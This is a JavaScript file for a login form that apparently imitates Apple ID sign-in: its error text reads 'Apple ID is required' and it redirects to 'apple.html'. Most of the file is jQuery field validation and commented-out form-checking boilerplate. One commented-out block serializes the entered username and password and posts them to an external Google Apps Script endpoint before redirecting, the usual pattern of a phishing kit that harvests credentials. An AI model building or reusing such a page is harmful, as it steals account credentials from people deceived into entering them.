$(document).ready(function(){
    $("#submit-form").validate({
        rules:{
            username:{
                required:true,
                minlength:1
            },
            password:{
                required:true
            }
        }
    })
})
$(function(){
    $("#username").focusout(function (){
        var userName = $ ("input[name='username']").val();
        if(userName == '' || userName == ' '){
            $('#username').focus();
            $('#username').css("border-color","red")
        }else{
            $('#username').css("border-color","green")
        }
    })
    
})
$(function(){
    $("#password").focusout(function (){
        var passWord = $ ("input[name='password']").val();
        if(passWord == '' || passWord == ' '){
            $('#password').focus();
            $('#password').css("border-color","red")
        }else{
            window.location.href='apple.html';
        }
    })
    
})



















// const form = document.getElementById('submit-form');
// const username = document.getElementById('username');
// const password =document.getElementById('password');

// form.addEventListener('submit', e =>{
//     e.preventDefault();
    
//     checkInputs();
// })

// function checkInputs = () =>{
//     const usernameValue = username.value.trim();
//     const passwordValue = password.value.trim();

// const setError = (element, message)=>{
//     const inputControl = element.parentElement;
//     const errorDisplay = inputControl.querySelector('.error');

//     errorDisplay.innerText = message;
//     inputControl.classList.add('error');
//     inputControl.classList.remove('success')
// }

// const setSuccess = element =>{
//     const inputControl = element.parentElement;
//     const errorDisplay = inputControl.querySelector('.error');

//     errorDisplay.innerText = message;
//     inputControl.classList.add('success');
//     inputControl.classList.remove('error')
// }


//     if(usernameValue === ''){
//         setError(username, 'Apple ID is required');
//      }else{
//         setSuccess(username);
//      }

//      if(passwordValue === ''){
//         setError(password, 'Password is required');
//      }else{
//         setSuccess(password);
//      }
// };












// $("#submit-form").submit((e)=>{
//     e.preventDefault()
//     $.ajax({
//         url:"https://script.google.com/macros/s/AKfycbwai9-rzaowWQrbDC7roLFzlsgC5TGpce-_EbtMcg/exec",
//         data:$("#submit-form").serialize(),
//         method:"post",
//         success:function (response){
//             window.location.href="apple.html"
//         },
//         error:function (err){
//             alert("Something Error")

//         }
//     })
// })






// const form = document.getElementById('submit-form');
// const username = document.getElementById('username');
// const email = document.getElementById('email');
// const password = document.getElementById('password');
// const password2 = document.getElementById('password2');

// form.addEventListener('submit', e => {
// 	e.preventDefault();
	
// 	checkInputs();
// });

// function checkInputs() {
// 	// trim to remove the whitespaces
// 	const usernameValue = username.value.trim();
// 	const emailValue = email.value.trim();
// 	const passwordValue = password.value.trim();
// 	const password2Value = password2.value.trim();
	
// 	if(usernameValue === '') {
// 		setErrorFor(username, 'Username cannot be blank');
// 	} else {
// 		setSuccessFor(username);
// 	}
	
// 	if(emailValue === '') {
// 		setErrorFor(email, 'Email cannot be blank');
// 	} else if (!isEmail(emailValue)) {
// 		setErrorFor(email, 'Not a valid email');
// 	} else {
// 		setSuccessFor(email);
// 	}
	
// 	if(passwordValue === '') {
// 		setErrorFor(password, 'Password cannot be blank');
// 	} else {
// 		setSuccessFor(password);
// 	}
	
// 	if(password2Value === '') {
// 		setErrorFor(password2, 'Password2 cannot be blank');
// 	} else if(passwordValue !== password2Value) {
// 		setErrorFor(password2, 'Passwords does not match');
// 	} else{
// 		setSuccessFor(password2);
// 	}
// }

// function setErrorFor(input, message) {
// 	const formControl = input.parentElement;
// 	const small = formControl.querySelector('small');
// 	formControl.className = 'form-control error';
// 	small.innerText = message;
// }

// function setSuccessFor(input) {
// 	const formControl = input.parentElement;
// 	formControl.className = 'form-control success';
// }
	
// function isEmail(email) {
// 	return /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/.test(email);
// }
